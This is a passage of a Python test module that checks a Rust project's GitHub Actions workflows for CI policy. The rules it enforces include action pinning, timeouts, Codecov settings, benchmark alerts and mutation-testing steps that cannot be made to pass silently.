        return repr(outputs.get((match.group(1), match.group(2)), ""))

    translated = _STEP_OUTPUT_RE.sub(lookup, raw)
    translated = translated.replace("&&", " and ").replace("||", " or ")
    translated = re.sub(r"!(?!=)", " not ", translated)
    translated = re.sub(r"\bcancelled\s*\(", "cancelled_fn(", translated)
    if not re.fullmatch(r"[A-Za-z0-9_ \t\(\)\'\"=<>!]+", translated):
        raise AssertionError(f"unsupported if expression: {expr!r} -> {translated!r}")

    def success() -> bool:
        return (not failed) and (not cancelled)

    def always() -> bool:
        return True

    def cancelled_fn() -> bool:
        return cancelled

    def failure() -> bool:
        return failed

    try:
        value = eval(  # noqa: S307 — workflow if, builtins removed
            translated,
            {"__builtins__": {}},
            {
                "success": success,
                "always": always,
                "cancelled_fn": cancelled_fn,
                "failure": failure,
                "True": True,
                "False": False,
            },
        )
    except Exception as exc:
        raise AssertionError(f"could not evaluate {expr!r}: {exc}") from exc
    if not isinstance(value, bool):
        raise AssertionError(f"if expression did not return a bool: {expr!r}")
    return value


def without_status_guard(expr: str) -> str:
    stripped = expr
    for _ in range(4):
        updated = _STATUS_GUARD_RE.sub("", stripped, count=1)
        if updated == stripped:
            break
        stripped = updated
    if stripped == expr:
        raise AssertionError(f"status guard was not removed from {expr!r}")
    return stripped


def assert_alert_followup_runs(text: str) -> None:
    """Issue and upload steps run after a failed check that set has_regressions."""
    outputs = {("regression_check", "has_regressions"): "true"}
    for name in _ALERT_ISSUE_STEPS:
        block = job_step_block(text, name)
        if "continue-on-error" in block:
            raise AssertionError(f"{name} must not use continue-on-error")
        expr = step_if_expression(block)
        runs = github_step_if_runs(
            expr, failed=True, cancelled=False, outputs=outputs
        )
        if not runs:
            raise AssertionError(
                f"{name} if-guard does not run after regression_check fails "
                "with has_regressions=true"
            )
        skipped = github_step_if_runs(
            expr,
            failed=True,
            cancelled=False,
            outputs={("regression_check", "has_regressions"): "false"},
        )
        if skipped:
            raise AssertionError(f"{name} runs when has_regressions is false")


def run_alert_check_in_runner(body: str, mode: str) -> tuple[int, str, bool]:
    """Run the check step body inside the real runner pwsh wrapper."""
    if shutil.which("pwsh") is None:
        raise AssertionError("pwsh is required to run the Actions runner wrapper")
    with tempfile.TemporaryDirectory(prefix="benchmark-alert-") as raw:
        workspace = Path(raw)
        scripts = workspace / "scripts"
        scripts.mkdir()
        shutil.copy(
            ROOT / "scripts" / "check_benchmark_thresholds.ps1",
            scripts / "check_benchmark_thresholds.ps1",
        )
        github = workspace / ".github"
        github.mkdir()
        (github / "benchmark_thresholds.json").write_text(
            json.dumps(
                {
                    "benchmarks": {
                        "sample": {
                            "baseline": 100,
                            "max_allowed": 150,
                            "unit": "ns",
                        }
                    }
                }
            ),
            encoding="utf-8",
        )
        results = workspace / "benchmark_results"
        results.mkdir()
        if mode == "regression":
            payload = [{"name": "sample", "value": 200, "unit": "ns"}]
        elif mode == "clean":
            payload = [{"name": "sample", "value": 100, "unit": "ns"}]
        elif mode == "checker_error":
            payload = None
        else:
            raise AssertionError(f"unknown alert fixture {mode}")
        if payload is not None:
            (results / "benchmarks.json").write_text(
                json.dumps(payload), encoding="utf-8"
            )
        script_path = workspace / "runner-step.ps1"
        contents = _RUNNER_PWSH_PREAMBLE + body + _RUNNER_PWSH_EPILOGUE
        script_path.write_text(contents, encoding="utf-8")
        github_output = workspace / "github_output.txt"
        github_output.write_text("", encoding="utf-8")
        env = os.environ.copy()
        env["GITHUB_OUTPUT"] = str(github_output)
        env["GITHUB_REF_NAME"] = "main"
        command = f". '{script_path}'"
        proc = subprocess.run(
            ["pwsh", "-command", command],
            cwd=workspace,
            env=env,
            capture_output=True,
            text=True,
            check=False,
        )
        output = github_output.read_text(encoding="utf-8")
        report = (workspace / "regression_report.md").is_file()
        if mode == "clean" and proc.returncode != 0:
            detail = (proc.stdout + "\n" + proc.stderr)[-2000:]
            raise AssertionError(f"clean check exited {proc.returncode}: {detail}")
        return proc.returncode, output, report


def assert_mutation_summary_requires_ai_success(text: str) -> None:
    summary = mutation_summary_job(text)
    report = job_step_block(summary, "Generate summary report")
    run = _run_script(report)
    if 'needs.mutants-ai.result }}" != "success"' not in run:
        raise AssertionError(
            "mutants-summary must fail when needs.mutants-ai.result is not success"
        )


def assert_mutation_ai_outcome_steps_not_softened(text: str) -> None:
    ai = mutation_ai_job(text)
    for step_name in ("Verify astraweave-ai shard outcomes", "Generate mutation report"):
        block = job_step_block(ai, step_name)
        if "continue-on-error: true" in block:
            raise AssertionError(f"{step_name} must not use continue-on-error")
        for line in _python_run_lines(_run_script(block)):
            if "|| true" in line:
                raise AssertionError(f"{step_name} must not mask failures with || true")
    summary = mutation_summary_job(text)
    report = job_step_block(summary, "Generate summary report")
    if "continue-on-error: true" in report:
        raise AssertionError("summary report must not use continue-on-error")
    for line in _python_run_lines(_run_script(report)):
        if "|| true" in line:
            raise AssertionError("summary report must not mask python failures with || true")


def assert_mutation_summary_checks_out_before_scoring(text: str) -> None:
    summary = mutation_summary_job(text)
    checkout = find_action_uses_pos(summary, "actions/checkout")
    scoring = summary.find("mutation_ai_outcomes.py")
    if checkout < 0:
        raise AssertionError("mutants-summary must checkout the repository")
    if scoring < 0:
        raise AssertionError("mutants-summary must score astraweave-ai outcomes")
    if checkout > scoring:
        raise AssertionError("checkout must precede mutation_ai_outcomes.py in mutants-summary")


def assert_mutation_ai_scoring_uses_strict_eval(text: str) -> None:
    ai = mutation_ai_job(text)
    report = job_step_block(ai, "Generate mutation report")
    run = report.split("run:", 1)[1]
    if 'eval "$(python3 scripts/ci/mutation_ai_outcomes.py' in run:
        raise AssertionError("shard report must not use unchecked eval $(python3 …)")
    if "counts=$(python3 scripts/ci/mutation_ai_outcomes.py" not in run:
        raise AssertionError("shard report must capture python output before eval")
    if ': "${DECIDED:?}"' not in run or '"${SCORE:?}"' not in run:
        raise AssertionError("shard report must require DECIDED and SCORE")
    summary = mutation_summary_job(text)
    report = job_step_block(summary, "Generate summary report")
    run = report.split("run:", 1)[1]
    if 'eval "$(python3 scripts/ci/mutation_ai_outcomes.py' in run:
        raise AssertionError("summary must not use unchecked eval $(python3 …)")
    if "counts=$(python3 scripts/ci/mutation_ai_outcomes.py" not in run:
        raise AssertionError("summary must capture python output before eval")
    if ': "${DECIDED:?}"' not in run or '"${SCORE:?}"' not in run:
        raise AssertionError("summary must require DECIDED and SCORE")


class WorkflowPolicyTest(unittest.TestCase):
    def test_pr_workflows_cancel_only_pull_requests(self) -> None:
        offenders = []
        for name, text in workflow_texts().items():
            if not has_pull_request(text):
                continue
            if CONCURRENCY_GROUP not in text or CONCURRENCY_CANCEL not in text:
                offenders.append(name)
            if "cancel-in-progress: true" in text:
                offenders.append(f"{name}:cancel-true")
        self.assertEqual(offenders, [])

    def test_every_job_has_a_timeout(self) -> None:
        missing = {
            name: jobs
            for name, text in workflow_texts().items()
            if (jobs := jobs_missing_timeout(text))
        }
        self.assertEqual(missing, {})

    def test_determinism_replay_is_not_path_filtered(self) -> None:
        text = (WORKFLOWS / "determinism-replay.yml").read_text(encoding="utf-8")
        self.assertNotIn("paths-ignore", text)
        self.assertNotIn("paths:", text)
        self.assertIn("ubuntu-latest", text)
        self.assertIn("windows-latest", text)
        self.assertIn("macos-latest", text)
        self.assertNotIn("cargo nextest", text)
        self.assertIn("no-retry", text)
        self.assertEqual(text.count("Fetch Aravath nature models"), 2)
        self.assertIn('CARGO_PROFILE_TEST_DEBUG: "0"', text)
        self.assertIn("cargo test -p astraweave-core --test replay_hash", text)
        self.assertIn('echo "RUSTFLAGS=-C target-cpu=x86-64" >> "$GITHUB_ENV"', text)

    def test_benchmarks_do_not_run_on_every_pull_request(self) -> None:
        text = (WORKFLOWS / "benchmark.yml").read_text(encoding="utf-8")
        self.assertIn("types: [labeled]", text)
        self.assertIn("run-benchmarks", text)
        self.assertIn('branches: ["main", "develop"]', text)
        self.assertIn("workflow_dispatch:", text)
        # Push already runs the shards. The 05:17 cron was a second run.
        self.assertNotIn("schedule:", text)
        self.assertNotIn("17 5 * * *", text)
        self.assertNotIn("pull_request:\n    branches:", text)

    def test_duplicate_workflows_are_gone(self) -> None:
        self.assertFalse((WORKFLOWS / "rust-cache-optimized.yml").exists())
        self.assertFalse((WORKFLOWS / "clippy-unwrap-prevention.yml").exists())

    def test_heavy_tier_is_not_on_pull_request(self) -> None:
        nightly_only = [
            "sanitizers.yml",
            "coverage.yml",
            "codeql-analysis.yml",
            "toolchain-management.yml",
            "integration-tests.yml",
            "sdk-ci.yml",
            "pbr-pipeline-ci.yml",
            "editor-ci.yml",
            "aw-editor-tests.yml",
            "allocation-measurement.yml",
        ]
        for name in nightly_only:
            text = (WORKFLOWS / name).read_text(encoding="utf-8")
            self.assertFalse(has_pull_request(text), name)
            if name in _COVERAGE_WORKFLOW_NAMES:
                self.assertEqual(codecov_trigger_violations(text, path=name), [])

    def test_ci_gate_is_required_before_heavy_jobs(self) -> None:
        text = (WORKFLOWS / "ci.yml").read_text(encoding="utf-8")
        self.assertIn("name: Gate (fmt, clippy, check)", text)
        self.assertIn("needs: [changes, gate]", text)
        script = (ROOT / "scripts" / "ci" / "run-tests.sh").read_text(encoding="utf-8")
        self.assertIn("--partition", script)
        self.assertIn("cargo nextest run", script)
        self.assertIn("cargo nextest archive", script)
        nextest = (ROOT / ".config" / "nextest.toml").read_text(encoding="utf-8")
        self.assertIn("retries = 0", nextest)
        self.assertIn("[profile.ci-pr]", nextest)
        self.assertIn("[profile.ci-pr-archive]", nextest)
        self.assertIn("[profile.ci-pr-linux-archive]", nextest)
        self.assertIn("default-filter", nextest)
        self.assertIn("family1_client_binary", text)
        self.assertIn("ci-pr-archive", text)
        self.assertIn("ci-pr-linux-archive", text)
        self.assertIn("timeout-minutes: 75", text)
        self.assertIn("Test (windows, build archive)", text)
        self.assertIn("Test (ubuntu, build archive)", text)
        self.assertIn("needs: [changes, gate, test-windows-build]", text)
        self.assertIn("needs: [changes, gate, test-linux-build]", text)
        # Nav stress ceilings run with the PR partitions. An unset
        # AW_PERF_ASSERTS skips them, which drops the old wall-clock gate.
        linux_job = text.split("\n  test-linux:\n", 1)[1].split("\n  test-windows-build:\n", 1)[0]
        windows_job = text.split("\n  test-windows:\n", 1)[1].split("\n  msrv:\n", 1)[0]
        self.assertIn("github.event_name == 'pull_request'", linux_job)
        self.assertIn("github.event_name == 'pull_request'", windows_job)
        self.assertIn('AW_PERF_ASSERTS: "1"', linux_job)
        self.assertIn('AW_PERF_ASSERTS: "1"', windows_job)
        linux = nextest.split("[profile.ci-pr-linux-archive]", 1)[1].split("\n[", 1)[0]
        self.assertNotIn("test_renderer_bake_environment_wave16", linux)
        self.assertNotIn("gpu_containment_invariant_120_frames", linux)
        self.assertNotIn("gpu_settling_envelope_300_frames", linux)
        for line in (ROOT / "scripts" / "ci" / "linux_archive_skips.txt").read_text(encoding="utf-8").splitlines():
            stripped = line.strip()
            if not stripped or stripped.startswith("#"):
                continue
            _kind, package, binary = stripped.split(" ", 2)
            self.assertIn(f"package(={package})", linux)
            self.assertIn(f"binary(={binary})", linux)

    def test_deferred_pr_filter_matches_the_list_and_skips_replay(self) -> None:
        listed = []
        for line in (ROOT / "scripts" / "ci" / "deferred_pr_tests.txt").read_text(encoding="utf-8").splitlines():
            stripped = line.strip()
            if not stripped or stripped.startswith("#"):
                continue
            package, binary, test = stripped.split(" ", 2)
            listed.append((package, binary, test))
        self.assertGreaterEqual(len(listed), 1)
        profile = (ROOT / ".config" / "nextest.toml").read_text(encoding="utf-8")
        for package, binary, test in listed:
            self.assertIn(f"package(={package})", profile)
            self.assertIn(f"binary(={binary})", profile)
            self.assertIn(f"test(={test})", profile)
            if binary == package:
                self.fail(f"lib binary should be the underscore target name, got {binary}")
        for replay in (
            "planner_pure",
            "perception_world",
            "gameplay_rng",
            "replay_hash",
            "gameplay_qa_aravath_slice",
        ):
            self.assertNotIn(replay, profile)
            self.assertNotIn(replay, (ROOT / "scripts" / "ci" / "deferred_pr_tests.txt").read_text(encoding="utf-8"))

    def test_aravath_supply_chain_uses_prebuilt_tools(self) -> None:
        text = (WORKFLOWS / "aravath-windows.yml").read_text(encoding="utf-8")
        self.assertNotIn("cargo install cargo-audit", text)
        self.assertNotIn("cargo install cargo-deny", text)
        self.assertNotIn("cargo install cargo-cyclonedx", text)
        script = (ROOT / ".github" / "scripts" / "install-prebuilt-cargo-tool.sh").read_text(encoding="utf-8")
        for tool in ("cargo-audit", "cargo-deny", "cargo-cyclonedx"):
            self.assertIn(f"install-prebuilt-cargo-tool.sh {tool}", text)
            self.assertIn(f"  {tool})", script)
        self.assertIn("cargo audit", text)
        self.assertIn("cargo deny check", text)
        self.assertIn("cargo cyclonedx", text)
        # Versions stay the ones the job used to cargo-install.
        self.assertIn("0.22.2", script)
        self.assertIn("0.20.2", script)
        self.assertIn("0.5.9", script)
        self.assertIn("9bd3e599314f50810c9d98b8b68a617ff9d3cc20873968d90b29d121f6b226ff", script)
        self.assertIn('"$tool" cyclonedx --version', script)

    def test_sccache_pull_requests_are_read_only(self) -> None:
        action = (ROOT / ".github" / "actions" / "rust-ci-setup" / "action.yml").read_text(encoding="utf-8")
        self.assertIn("CARGO_INCREMENTAL=0", action)
        self.assertIn("SCCACHE_GHA_RW_MODE=READ_ONLY", action)
        self.assertIn("SCCACHE_GHA_RW_MODE=READ_WRITE", action)
        self.assertIn("refs/heads/main", action)
        # RUSTFLAGS replaces every rustflags entry. The pin is in cargo config.
        self.assertNotIn("RUSTFLAGS=", action)
        config = (ROOT / ".cargo" / "config.toml").read_text(encoding="utf-8")
        self.assertIn("[target.x86_64-unknown-linux-gnu]", config)
        self.assertIn('"-C", "target-cpu=x86-64"', config)
        self.assertIn("[target.x86_64-pc-windows-msvc]", config)
        self.assertIn("link-args=/STACK:16777216", config)
        self.assertIn("[target.x86_64-pc-windows-gnu]", config)
        self.assertIn("link-args=-Wl,--stack,16777216", config)
        replay = (WORKFLOWS / "determinism-replay.yml").read_text(encoding="utf-8")
        self.assertIn('echo "RUSTFLAGS=-C target-cpu=x86-64" >> "$GITHUB_ENV"', replay)
        self.assertIn("target-cpu=native is forbidden", replay)
        aravath = (WORKFLOWS / "aravath-determinism.yml").read_text(encoding="utf-8")
        self.assertIn("-C target-feature=-fma", aravath)

    def test_scoped_workflows_keep_their_checks_and_fail_closed(self) -> None:
        scoped = {
            "aravath-windows.yml": "aravath",
            "aravath-determinism.yml": "aravath-determinism",
            "render-device-validation.yml": "render-device",
            "net-tests.yml": "net",
        }
        texts = workflow_texts()
        for name, scope in scoped.items():
            text = texts[name]
            self.assertIn(f"--scope {scope}", text)
            self.assertIn("Fail closed when scope detection fails", text)
            if name == "aravath-determinism.yml":
                # The matrix job always starts so each OS check name exists.
                # The first step fails the job when classify did not succeed.
                self.assertIn("needs.scope.result != 'success'", text)
            else:
                self.assertIn("needs.scope.result == 'failure'", text)
            self.assertNotIn("paths-ignore:", text)
            self.assertNotIn("\n    paths:", text)
        # The matrix must keep expanding so the per-OS check names exist.
        det = texts["aravath-determinism.yml"]
        self.assertIn("name: Replay hash (${{ matrix.os }})", det)
        self.assertIn("if: ${{ !cancelled() }}", det)
        self.assertIn("replay_matches_golden_hash", det)
        self.assertNotIn("needs.scope.outputs.run == 'true'\n    runs-on:", det)
        windows = texts["aravath-windows.yml"]
        self.assertIn("name: cargo-audit, cargo-deny, SBOM", windows)
        self.assertIn("name: Volumetrics validation on lavapipe", windows)
        self.assertIn("name: Build, test, and upload greybox", windows)
        self.assertIn("cargo audit", windows)
        self.assertIn("cargo deny check", windows)
        self.assertIn("cargo cyclonedx", windows)
        render = texts["render-device-validation.yml"]
        self.assertIn("name: Startup passes (lavapipe)", render)
        self.assertIn("name: Startup passes (Windows)", render)
        self.assertIn("created_pass_validation", render)
        self.assertIn("frame_alloc", render)
        self.assertIn("stream_fallback", render)
        self.assertIn("gpu_timestamp", render)
        net = texts["net-tests.yml"]
        self.assertIn("name: net-tests", net)
        self.assertIn("cargo test -p astraweave-net --all-features --verbose", net)
        replay = texts["determinism-replay.yml"]
        self.assertNotIn("--scope", replay)
        self.assertNotIn("Affected scope", replay)

    def test_detect_checks_out_merge_parents_only(self) -> None:
        text = (WORKFLOWS / "ci.yml").read_text(encoding="utf-8")
        changes = text.split("name: Detect affected crates", 1)[1].split("\n  gate:", 1)[0]
        self.assertIn("fetch-depth: 2", changes)
        self.assertNotIn("fetch-depth: 0", changes)
        self.assertIn("fetch-tags: false", changes)
        self.assertNotIn("git fetch", changes)
        self.assertIn('--base "HEAD^1"', changes)
        self.assertIn("--head HEAD", changes)
        self.assertIn("reason=missing-merge-parent", changes)

    def test_nightly_failure_issue_serializes_per_upstream_run(self) -> None:
        text = (WORKFLOWS / "nightly-failure-issue.yml").read_text(encoding="utf-8")
        self.assertIn(
            "group: ${{ github.workflow }}-${{ github.event.workflow_run.id }}",
            text,
        )
        self.assertIn("cancel-in-progress: false", text)
        self.assertNotIn("group: ${{ github.workflow }}-${{ github.ref }}", text)

    def test_nightly_failure_issue_watched_names_match_workflows(self) -> None:
        text = (WORKFLOWS / "nightly-failure-issue.yml").read_text(encoding="utf-8")
        watched = nightly_failure_watched_workflows(text)
        known = workflow_display_names()
        self.assertEqual(len(watched), 20)
        missing = [name for name in watched if name not in known]
        self.assertEqual(missing, [])
        self.assertIn("determinism-replay", watched)
        self.assertNotIn("Determinism Replay", watched)

    def test_nightly_failure_issue_job_skips_fork_and_pull_request_runs(self) -> None:
        text = (WORKFLOWS / "nightly-failure-issue.yml").read_text(encoding="utf-8")
        self.assertIn("head_repository.full_name == github.repository", text)
        self.assertIn("github.event.workflow_run.event == 'schedule'", text)
        self.assertIn("github.event.workflow_run.event == 'push'", text)
        self.assertIn("github.event.workflow_run.event == 'workflow_dispatch'", text)
        self.assertNotIn("github.event.workflow_run.event == 'pull_request'", text)
        self.assertNotIn(
            "github.event.workflow_run.event == 'schedule' ||\n"
            "       github.event.workflow_run.head_branch == 'main')",
            text,
        )

    def test_one_off_replay_workflows_stay_removed(self) -> None:
        for name in (
            "ai-depth-replay.yml",
            "combat-replay.yml",
            "determinism-replay-mod.yml",
        ):
            self.assertFalse(
                (WORKFLOWS / name).exists(),
                f"{name} must stay removed; cross-OS replay lives in determinism-replay.yml",
            )

    def test_frame_alloc_sites_is_dispatch_only(self) -> None:
        text = (WORKFLOWS / "frame-alloc-sites.yml").read_text(encoding="utf-8")
        on_block = text.split("on:", 1)[1].split("\npermissions:", 1)[0]
        self.assertIn("workflow_dispatch:", on_block)
        self.assertNotIn("push:", on_block)
        self.assertIn("frame_alloc_test_executable.py", text)

    def test_assets_prefetch_uses_polyhaven_provider_filter(self) -> None:
        text = (WORKFLOWS / "assets-prefetch.yml").read_text(encoding="utf-8")
        self.assertIn("--manifest assets/asset_manifest.toml", text)
        self.assertIn("--provider polyhaven", text)
        self.assertNotIn("astraweave-assets -- check", text)

    def test_allocation_measurement_is_a_real_gate_off_prs(self) -> None:
        text = (WORKFLOWS / "allocation-measurement.yml").read_text(encoding="utf-8")
        self.assertIn("schedule:", text)
        self.assertIn("branches: [main]", text)
        self.assertIn("gpu_frame_budget", text)
        self.assertIn("zero_alloc_tick", text)
        self.assertIn("zero_alloc_step", text)
        self.assertIn("[self-hosted, gpu]", text)
        self.assertNotIn("continue-on-error: true", text)
        self.assertFalse(has_pull_request(text))

    def test_pinned_nightly_steps_follow_the_experimental_flag(self) -> None:
        text = (WORKFLOWS / "toolchain-management.yml").read_text(encoding="utf-8")
        self.assertIn("toolchain: pinned-nightly", text)
        self.assertNotIn("toolchain: nightly\n", text)
        fmt = text.split("name: Check code formatting compatibility", 1)[1].split(
            "name: Run clippy with toolchain", 1
        )[0]
        self.assertIn("if: ${{ !matrix.experimental }}", fmt)
        self.assertNotIn("'nightly'", fmt)
        nightly = text.split("name: Test nightly features (if nightly)", 1)[1].split(
            "\n  msrv-check:", 1
        )[0]
        self.assertIn("if: matrix.experimental", nightly)
        self.assertNotIn("'nightly'", nightly)

    def test_mutation_ai_caps_memory_and_uploads_on_failure(self) -> None:
        text = mutation_testing_text()
        ai = mutation_ai_job(text)
        self.assertIn("ulimit -v 6291456", ai)
        self.assertIn("--in-place", ai)
        self.assertIn("--shard ${{ matrix.shard }}/8", ai)
        self.assertNotIn("--jobs 1", ai)
        self.assertIn("Verify astraweave-ai shard outcomes", ai)
        self.assertIn("mutation_ai_outcomes.py", ai)
        report = ai.split("Generate mutation report", 1)[1].split("Upload mutation results", 1)[0]
        upload = ai.split("Upload mutation results", 1)[1]
        self.assertIn("if: always()", report)
        self.assertIn("if: always()", upload)

    def test_mutation_summary_requires_ai_matrix_success(self) -> None:
        text = mutation_testing_text()
        assert_mutation_summary_requires_ai_success(text)
        without = text.replace(
            'elif [ "${{ needs.mutants-ai.result }}" != "success" ]; then',
            'elif false; then',
            1,
        )
        with self.assertRaises(AssertionError):
            assert_mutation_summary_requires_ai_success(without)

    def test_mutation_ai_outcome_steps_are_not_softened(self) -> None:
        text = mutation_testing_text()
        assert_mutation_ai_outcome_steps_not_softened(text)
        softened = text.replace(
            "python3 scripts/ci/mutation_ai_outcomes.py --verify-shard",
            "python3 scripts/ci/mutation_ai_outcomes.py --verify-shard || true",
            1,
        )
        with self.assertRaises(AssertionError):
            assert_mutation_ai_outcome_steps_not_softened(softened)
        softened = text.replace(
            "      - name: Verify astraweave-ai shard outcomes\n        if: always()\n        run: |",
            "      - name: Verify astraweave-ai shard outcomes\n        if: always()\n        continue-on-error: true\n        run: |",
            1,
        )
        with self.assertRaises(AssertionError):
            assert_mutation_ai_outcome_steps_not_softened(softened)

    def test_mutation_summary_checks_out_before_scoring(self) -> None:
        text = mutation_testing_text()
        assert_mutation_summary_checks_out_before_scoring(text)
        checkout_line = summary_checkout_step_line(text)
        without_checkout = text.replace(f"{checkout_line}\n\n", "", 1)
        with self.assertRaises(AssertionError):
            assert_mutation_summary_checks_out_before_scoring(without_checkout)
        reordered = without_checkout.replace(
            'Detailed results available in workflow artifacts." >> "$GITHUB_STEP_SUMMARY"',
            f'Detailed results available in workflow artifacts." >> "$GITHUB_STEP_SUMMARY"\n\n      {checkout_line.strip()}',
            1,
        )
        with self.assertRaises(AssertionError) as ctx:
            assert_mutation_summary_checks_out_before_scoring(reordered)
        self.assertIn("must precede", str(ctx.exception))

    def test_workflow_action_pins(self) -> None:
        violations: list[str] = []
        for name, text in workflow_texts().items():
            violations.extend(workflow_action_pin_violations(text, path=name))
        self.assertEqual(violations, [])

    def test_third_party_actions_are_commit_pinned(self) -> None:
        violations: list[str] = []
        codecov: list[str] = []
        for path in github_action_surfaces():
            text = path.read_text(encoding="utf-8")
            rel = str(path.relative_to(ROOT))
            violations.extend(third_party_action_pin_violations(text, path=rel))
            codecov.extend(codecov_fail_ci_violations(text, path=rel))
            codecov.extend(codecov_continue_on_error_violations(text, path=rel))
            codecov.extend(codecov_explicit_file_violations(text, path=rel))
            codecov.extend(codecov_oidc_violations(text, path=rel))
            codecov.extend(codecov_with_key_violations(text, path=rel))
            codecov.extend(codecov_token_violations(text, path=rel))
            codecov.extend(codecov_trigger_violations(text, path=rel))
            codecov.extend(coverage_artifact_pin_violations(text, path=rel))
            codecov.extend(coverage_permission_violations(text, path=rel))
            codecov.extend(least_privilege_permission_violations(text, path=rel))
            codecov.extend(kani_version_violations(text, path=rel))
            codecov.extend(kani_dispatch_args_violations(text, path=rel))
            codecov.extend(kani_job_steps_violations(text, path=rel))
            codecov.extend(kani_timeout_run_violations(text, path=rel))
            codecov.extend(run_context_violations(text, path=rel))
            codecov.extend(rust_ci_setup_violations(text, path=rel))
            codecov.extend(coverage_report_publish_violations(text, path=rel))
            codecov.extend(checkout_persist_credentials_violations(text, path=rel))
            codecov.extend(kani_action_sha_violations(text, path=rel))
            codecov.extend(llvm_cov_pin_violations(text, path=rel))
        self.assertEqual(violations, [])
        self.assertEqual(codecov, [])
        ignored = "uses: actions/checkout@v7\nuses: ./.github/actions/rust-ci-setup\n"
        self.assertEqual(third_party_action_pin_violations(ignored), [])

    def test_codecov_upload_artifact_tag_mutant_is_rejected(self) -> None:
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        self.assertEqual(coverage_artifact_pin_violations(text, path="coverage.yml"), [])
        mutant = text.replace(
            "uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2",
            "uses: actions/upload-artifact@v7",
            1,
        )
        self.assertNotEqual(mutant, text)
        violations = coverage_artifact_pin_violations(mutant, path="coverage.yml")
        self.assertTrue(violations)
        self.assertIn("actions/upload-artifact@v7", violations[0])
        self.assertIn(COVERAGE_ARTIFACT_SHA_MSG, violations[0])
        checkout = text.replace(
            "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7",
            "actions/checkout@v7",
            1,
        )
        self.assertNotEqual(checkout, text)
        checkout_violations = coverage_artifact_pin_violations(checkout, path="coverage.yml")
        self.assertTrue(checkout_violations)
        self.assertIn("actions/checkout@v7", checkout_violations[0])
        self.assertIn(COVERAGE_ARTIFACT_SHA_MSG, checkout_violations[0])
        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        self.assertEqual(coverage_artifact_pin_violations(editor, path="aw-editor-tests.yml"), [])
        editor_mutant = editor.replace(
            "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7",
            "actions/checkout@v7",
            1,
        )
        self.assertNotEqual(editor_mutant, editor)
        editor_violations = coverage_artifact_pin_violations(
            editor_mutant, path="aw-editor-tests.yml"
        )
        self.assertTrue(editor_violations)
        self.assertIn("actions/checkout@v7", editor_violations[0])
        local = "uses: ./.github/actions/rust-ci-setup\n"
        self.assertEqual(coverage_artifact_pin_violations(local, path="coverage.yml"), [])

    def test_codecov_action_v7_tag_mutant_is_rejected(self) -> None:
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        self.assertEqual(third_party_action_pin_violations(text, path="coverage.yml"), [])
        mutant = re.sub(
            r"codecov/codecov-action@[0-9a-f]{40}",
            "codecov/codecov-action@v7",
            text,
            count=1,
        )
        self.assertNotEqual(mutant, text)
        violations = third_party_action_pin_violations(mutant, path="coverage.yml")
        self.assertTrue(violations)
        self.assertIn("codecov/codecov-action@v7", violations[0])
        self.assertIn(THIRD_PARTY_SHA_MSG, violations[0])

    def test_codecov_fail_ci_if_error_false_mutant_is_rejected(self) -> None:
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        self.assertEqual(codecov_fail_ci_violations(text, path="coverage.yml"), [])
        mutant = text.replace("fail_ci_if_error: true", "fail_ci_if_error: false", 1)
        self.assertNotEqual(mutant, text)
        violations = codecov_fail_ci_violations(mutant, path="coverage.yml")
        upload_line = next(
            number
            for number, line in enumerate(mutant.splitlines(), start=1)
            if "Upload coverage to Codecov" in line
        )
        self.assertEqual(
            violations,
            [f"coverage.yml: {upload_line}: {CODECOV_FAIL_CI_MSG}"],
        )
        # A later step that mentions the true value does not cover this step.
        decoy = mutant.replace(
            "          use_oidc: true\n",
            "          use_oidc: true\n\n"
            "      - name: Not codecov\n"
            '        run: "echo fail_ci_if_error: true"\n',
            1,
        )
        self.assertNotEqual(decoy, mutant)
        decoy_violations = codecov_fail_ci_violations(decoy, path="coverage.yml")
        self.assertTrue(decoy_violations)
        self.assertIn(CODECOV_FAIL_CI_MSG, decoy_violations[0])

    def test_codecov_continue_on_error_mutant_is_rejected(self) -> None:
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        self.assertEqual(codecov_continue_on_error_violations(text, path="coverage.yml"), [])
        self.assertNotIn("continue-on-error", text)
        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        editor_jobs = {job_id: block for _, job_id, block in _job_blocks(editor)}
        self.assertNotIn("continue-on-error", editor_jobs["coverage"])
        self.assertIn("continue-on-error: true", editor_jobs["test"])
        self.assertEqual(
            codecov_continue_on_error_violations(editor, path="aw-editor-tests.yml"),
            [],
        )
        job_mutant = text.replace(
            "    timeout-minutes: 45\n",
            "    timeout-minutes: 45\n    continue-on-error: true\n",
            1,
        )
        self.assertNotEqual(job_mutant, text)
        job_line = next(
            number
            for number, line in enumerate(job_mutant.splitlines(), start=1)
            if line.strip() == "continue-on-error: true"
        )
        job_violations = codecov_continue_on_error_violations(job_mutant, path="coverage.yml")
        self.assertEqual(
            job_violations,
            [f"coverage.yml: {job_line}: {CODECOV_CONTINUE_MSG}"],
        )
        step_mutant = text.replace(
            "        uses: codecov/codecov-action@",
            "        continue-on-error: true\n        uses: codecov/codecov-action@",
            1,
        )
        self.assertNotEqual(step_mutant, text)
        step_line = next(
            number
            for number, line in enumerate(step_mutant.splitlines(), start=1)
            if line.strip() == "continue-on-error: true"
        )
        step_violations = codecov_continue_on_error_violations(step_mutant, path="coverage.yml")
        self.assertEqual(
            step_violations,
            [f"coverage.yml: {step_line}: {CODECOV_CONTINUE_MSG}"],
        )
        sibling = text.replace(
            "      - name: Install cargo-tarpaulin\n        run:",
            "      - name: Install cargo-tarpaulin\n        continue-on-error: true\n        run:",
            1,
        )
        self.assertNotEqual(sibling, text)
        sibling_line = next(
            number
            for number, line in enumerate(sibling.splitlines(), start=1)
            if line.strip() == "continue-on-error: true"
        )
        sibling_violations = codecov_continue_on_error_violations(sibling, path="coverage.yml")
        self.assertEqual(
            sibling_violations,
            [f"coverage.yml: {sibling_line}: {CODECOV_CONTINUE_MSG}"],
        )
        editor_mutant = editor.replace(
            "    - name: Generate Coverage Report\n      run: |\n",
            "    - name: Generate Coverage Report\n      continue-on-error: true\n      run: |\n",
            1,
        )
        self.assertNotEqual(editor_mutant, editor)
